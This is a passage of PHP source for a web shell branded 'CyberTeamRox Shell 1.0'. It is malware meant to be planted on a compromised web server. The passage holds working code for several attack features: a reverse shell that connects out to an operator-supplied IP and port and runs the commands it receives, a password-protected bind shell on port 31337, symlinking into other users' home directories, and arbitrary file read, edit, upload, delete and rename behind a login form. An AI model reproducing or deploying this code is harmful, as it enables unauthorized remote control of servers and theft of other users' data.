                    if ($uid)
                    $temp .= join(':',$uid)."
                    ";
                    }
                    echo '<br/>';
                    $temp = trim($temp);
                     
                    $file5 = fopen("test.txt","w");
                    fputs($file5,$temp);
                    fclose($file5);
                     
                    $dcount = 1;
                    $file = fopen("test.txt", "r") or exit("Unable to open file!");
                    while(!feof($file))
                    {
                    $s = fgets($file);
                    $matches = array();
                    $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                    $matches = str_replace("home/","",$matches[1]);
                    if(strlen($matches) > 12 || strlen($matches) == 0 || $matches == "bin" || $matches == "etc/X11/fs" || $matches == "var/lib/nfs" || $matches == "var/arpwatch" || $matches == "var/gopher" || $matches == "sbin" || $matches == "var/adm" || $matches == "usr/games" || $matches == "var/ftp" || $matches == "etc/ntp" || $matches == "var/www" || $matches == "var/named")
                    continue;
                    echo "<table><tr><td align=center><font size=3>" . $dcount . "</td><td align=center><font class=txt>" . $matches . "</td>";
                    echo "<td align=center><font class=txt><font color=red>>>></font><a href=/ctr/root/home/" . $matches . "/public_html target='_blank'>Symlink</a></td></tr></table>";
                 
                    }
                    fclose($file);
                    echo "</table>";
                    unlink("test.txt");
                    }
                    else
                    echo "<center><font size=4>Cannot create Symlink</font></center>";
                    }
                    }
                    }
                    }
else if(isset($_GET['connect']))
{
    if(isset($_POST['ip']) &&
     isset($_POST['port']) && 
        $_POST['ip'] != "" &&
        $_POST['port'] != ""
     )
    {
        echo "<p>The Program is now trying to connect!</p>";
        $ip = $_POST['ip']; 
        $port=$_POST['port']; 
        $sockfd=fsockopen($ip , $port , $errno, $errstr ); 
        if($errno != 0)
        {
            echo "<font color='red'><b>$errno</b> : $errstr</font>";
        }
        else if (!$sockfd)
        { 
               $result = "<p>Fatal : An unexpected error was occured when trying to connect!</p>";
        } 
        else
        { 
            fputs ($sockfd ,"\---------CTR-SHELL-------");
         $pwd = exec_all("pwd");
         $sysinfo = exec_all("uname -a");
         $id = exec_all("id");
         $dateAndTime = exec_all("time /t & date /T");
         $len = 1337;
         fputs($sockfd ,$sysinfo . "\n" );
         fputs($sockfd ,$pwd . "\n" );
         fputs($sockfd ,$id ."\n\n" );
         fputs($sockfd ,$dateAndTime."\n\n" );
         while(!feof($sockfd))
         {  
            $cmdPrompt ="(CTR-Shell)[$]> ";
            fputs ($sockfd , $cmdPrompt ); 
            $command= fgets($sockfd, $len);
            fputs($sockfd , "\n" . exec_all($command) . "\n\n");
        } 
        fclose($sockfd); 
        } 
    }
    else if(
    isset($_POST['port']) &&
    isset($_POST['passwd']) && 
    $_POST['port'] != "" &&
    $_POST['passwd'] != ""  )
    {
        // Set time limit to indefinite execution
        set_time_limit (0);
        
        
       
        $address = '127.0.0.1';
        $port = $_POST['port'];
        $pass = $_POST['passwd'];

        if(function_exists("socket_create"))
        {
    
        $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);  
        if(socket_bind($sockfd, $address, $port) == FALSE)
        {
            echo "Cant Bind to the specified port and address!";
        }
      
        socket_listen($sockfd,15);
        
    
        $passwordPrompt = "\n\n\n0xPassword : ";
        
        $client = socket_accept($sockfd);
        

        socket_write($client , $passwordPrompt);
        
        $input = socket_read($client, strlen($pass) + 2); // +2 for \r\n
        if(trim($input) == $pass)
        {
            socket_write($client , "\n\n");
            socket_write($client , ($os == "Windows") ? exec_all("date /t & time /t")  . "\n" . exec_all("ver") : exec_all("date") . "\n" . exec_all("uname -a"));
            socket_write($client , "\n\n");
            while(1)
            {
             
                $commandPrompt ="(CTR-Shell)[$]> ";
                $maxCmdLen = 31337;
                socket_write($client,$commandPrompt);
                $cmd = socket_read($client,$maxCmdLen);
                if($cmd == FALSE)
                {
                    echo "The client Closed the conection!";
                    break;
                }
                socket_write($client , exec_all($cmd));
            }
        }
        else
        {
            echo "Wrong Password!";
            socket_write($client, "sU(|< - Fuck you\n\n");
        }
        socket_shutdown($client, 2);
        socket_close($socket);
        
        // Close the client (child) socket
        //socket_close($client);
        // Close the master sockets
        //socket_close($sock);
        }
        else
        {
            echo "Socket Conections not Allowed/Supported by the server! <br />";
        }
    }
    else
    {
    ?>       
    <table class="" align="center" >
    <tr>
        <th class="" colspan="1" width="50px"><u>Back Connection</u></th>
        
    </tr>
    <tr>
        <form method='POST' >  
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>IP </td>
                    <td>
                        <input style="width: 200px;" class="cmd" name="ip" value="<?php getClientIp();?>" />
                    </td>
                </tr>
                <tr>
                    <td>Port </td>
                    <td><input style="width: 100px;" class="cmd" name="port" size='5' value="31337"/>&nbsp;&nbsp;<input style="width: 90px;" class="own" type="submit" value="Connect!"/></td>
                </tr>
            </table>
      
         </form> 
         <form method="POST"><hr>
      
            <table style="border-spacing: 6px;">
  <th class="" colspan="2" width="50px"><u>Bind Port</u></th>
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" class="cmd" name="port" value="31337" />
                    </td>
                </tr>
                <tr>
                    <td>Passwd </td>
                    <td><input style="width: 100px;" class="cmd" name="passwd" size='5' value="Witch3r"/>&nbsp;&nbsp;<input style="width: 90px;" class="own" type="submit" value="Bind"/></td>
                </tr>
            </table>
         </td>
         </form>
    </tr>
    </table>
    
<?php
    }
}

else if(isset($_POST['file']) &&
        isset($_POST['content']) )
{
    if(is_dir($_POST['file']))
    {
        header("location:".$self."?dir=".$_POST['file']);
    }
    if(file_exists($_POST['file']))
    {
        $handle = fopen($_POST['file'],"w");
        fwrite($handle,$_POST['content']);
        echo "Your changes were Successfully Saved!";
    }
    else
    {
        echo "<p class='alert'>File Name Specified does not exists!</p>";
    }
}


else if(isset($_GET['open']))
{
    ?>
        <form method="POST" action="<?php echo $self;?>" >
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['open'];?>" class="cmd" name="file" /></td>
            </tr>
            <tr>
                <td>Size </td><td> : </td><td><input value="<?php echo filesize($_GET['open']);?>" class="cmd" /></td> 
            </tr>
        </table>
        <textarea name="content" rows="20" cols="100" class="cmd"><?php
        $content = htmlspecialchars(file_get_contents($_GET['open']));
        if($content)
        {
            echo $content;
        }
        else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
        {
            fopen($_GET['open']);
            while(!feof())
            {
                echo htmlspecialchars(fgets($_GET['open']));
            }
        }

        ?>
        </textarea><br />
        <input name="save" type="Submit" value="Save Changes" class="own" id="spacing"/>
        </form>
    <?php
}

else if(isset($_GET['open']))
{
    ?>
        <form method="POST" action="<?php echo $self;?>" >
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['open'];?>" class="cmd" name="file" /></td>
            </tr>
            <tr>
                <td>Size </td><td> : </td><td><input value="<?php echo filesize($_GET['open']);?>" class="cmd" /></td> 
            </tr>
        </table>
        <textarea name="content" rows="20" cols="100" class="cmd"><?php
        $content = htmlspecialchars(file_get_contents($_GET['open']));
        if($content)
        {
            echo $content;
        }
        else if(function_exists('fgets') && function_exists('fopen') && function_exists('feof'))
        {
            fopen($_GET['open']);
            while(!feof())
            {
                echo htmlspecialchars(fgets($_GET['open']));
            }
        }

        ?>
        </textarea><br />
        <input name="save" type="Submit" value="Save Changes" class="own" id="spacing"/>
        </form>
    <?php
}
else if(isset($_GET['rename']))
{
    if(isset($_GET['to']) && isset($_GET['rename']))
    {
        if(rename($_GET['rename'],$_GET['to']) == FALSE)
        {
            ?>
            <big><p class="blink">Cant rename the file specified! Please check the file-name , Permissions and try again!</p></big>
            <?php
        }
        else
        {
            ?>
            <big><p class="blink">File Renamed , Return <a href="<?php echo $self;?>">Here</a></p></big>
            <?php
        }
    }
    else
    {
?>
    <form method="GET" action="<?php echo $self;?>" >
        <table>
            <tr>
                <td>File </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" class="cmd" name="rename" /></td>
            </tr>
            <tr>
                <td>To </td><td> : </td><td><input value="<?php echo $_GET['rename'];?>" class="cmd" name="to" /></td> 
            </tr>
        </table>
        <input type="Submit" value="Rename" class="own" style="margin-left: 160px;padding: 5px;"/>
        </form>   
    <?php
    }
}
else if(ctr==ctr)
{
?>

<form method="post"  enctype="multipart/form-data">
<table id="margins" width="35" border="0" cellpadding="1" cellspacing="1" class="box">
<tr> 
<td width="246">
<input type="hidden" name="MAX_FILE_SIZE" value="200000000000000">
<input name="userfile" type="file" id="userfile"> 
</td>
<td width="80"><input  class="button" type="submit" class="box" id="upload" value=" Upload "></td>
</tr>
</table>
</form><br>
<hr color=green>
<?php
$uploaddir = $_GET['dir'].'/';
$uploadfile = $uploaddir . basename($_FILES['userfile']['name']);
if (isset($_FILES['userfile']['name'])) {
        if (move_uploaded_file($_FILES['userfile']['tmp_name'], $uploadfile)) {
                echo "<font color= #00FF00><center>The file ". basename($_FILES['userfile']['name']) ." has been uploaded</center></font>";
        } else {
                echo "<font color= #e61e1e><center>There was an error uploading the file.Try again!</center></font>";
        }}
    $dir = getcwd();
    if(isset($_GET['dir']))
    {
        $dir = $_GET['dir'];
    }
    ?>
    <table id="margins">
    <tr>
        <form method="GET"  action="<?php echo $self;?>">
        <td width="100"></td><td width="410"><input name="dir" class="cmd" id="mainInput" value="<?php echo $dir;?>"/></td>
        <td><input type="submit" value="Enter" class="own" /></td>
        </form>
    </tr>
    </table>
    
    <table id="margins" class="files" border=0 >

    <?php
    
    if(isset($_GET['delete']))
    {
        if(unlink(($_GET['delete'])) == FALSE)
        {
            echo "<p id='margins' style='color:red;'>Could Not Delete the file Specified!</p>";
        }
    }
    if(is_dir($dir))
    {
        $handle = opendir($dir);
        if($handle != FALSE)
        {
        if($dir[(strlen($dir)-1)] != $SEPARATOR){$dir = $dir.$SEPARATOR;}
        while (false !== ($file = readdir($handle))) {
                if ($file != "." && $file != "..")
        {
                //echo $file;
                //f its a directory
                if(is_dir($dir.$file))
                {
                    ?>
                    <tr>
                    <td class='dir'><a href='<?php echo $self ?>?dir=<?php echo $dir.$file ?>'>/<?php echo $file ?></a></td>
                    <td class='info'>DIR</td>
                    <td class='info'>DIR</td>
                    <td></td>
                    <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
                    </tr>
                <?php
                }
       
                else
                {
                    ?>
                    <tr>
                    <td class='file'><a href='<?php echo $self ?>?open=<?php echo $dir.$file ?>'><?php echo $file ?></a></td>
                    <td class='info'><?php echo HumanReadableFilesize(filesize($dir.$file));?></td>
                    <td class='info'><?php echo getFilePermissions($dir.$file);?></td>
                    <td class="info"><a href="<?php echo $self;?>?delete=<?php echo $dir.$file;?>">Delete</a></td>
                    <td class="info"><a href="<?php echo $self;?>?rename=<?php echo $dir.$file;?>">Rename</a></td>
                    </tr>
                    <?php
                }
            }
        }
        closedir($handle);
        }
    }
    else
    {
        echo "<p class='alert' id='margins'>".$_GET['dir']."Directory Not Found!<br /></p>";
    }
    ?>
    </table>
    <?php
  
}
?>



<br /><br /><br /><br />


CyberTeamRox-Shell 1.0

</body></html>
</font>
<?php
}

else if (isset($_POST['submit'])) {

if ($_POST['password'] == $password){

		
		$_SESSION["login"] = $pass;
		header("Location: $_SERVER[PHP_SELF]");
		
} else {	

		
             echo '<font color=red><p>Access Denied!</p></font>';
		display_login_form();
                
		
		
	}
}		

else { 

	display_login_form();

}


function display_login_form(){ ?>          <html><head><title>CTR Shell 1.0</title></head>         <body bgcolor=black><center>         <font color=white><br><br>         <font face=impact color=green size=12>CyberTeamRox Shell 1.0</font><br><br>  
<font size="-3">
<img src=http://ibin.co/1uRrmLl6HXlk><br><br><br><br> <form action="<?php echo $self; ?>" method='post'>    <center><font color=white> 	&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<input type="password" name="password" id="password"> 	<input type="submit" style="visibility:hidden" name="submit" value="Submit"></font></form><font color=green size=6><br><br><font color=white>Coded by Witch3r</font> <?php } ?>